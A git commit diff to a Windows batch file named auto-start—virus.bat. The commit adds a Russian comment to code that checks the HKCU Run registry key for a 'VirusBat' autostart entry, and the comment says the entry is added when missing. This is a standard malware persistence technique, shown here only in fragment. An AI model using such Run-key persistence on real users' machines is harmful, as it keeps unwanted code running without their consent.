e2bba00417a8a6301e4fa7d5f80338fff4a98777
osager-net <RuslanGamidov2015@yandex.ru>
2026-05-03 20:57:54 +0400

    Update auto-start—virus.bat

--- viruses/auto-start—virus.bat
+++ viruses/auto-start—virus.bat
@@ -1,6 +1,7 @@
 :: (Проверка существования автозапуска в реестре)
 reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "VirusBat" >nul 2>&1
 
+:: (Проверка ошибок, и когда автозапуск отсутствует он добавлятся)
 if %errorlevel% == 0 (
     echo Запись WorkBat уже существует в реестре!
 ) else (
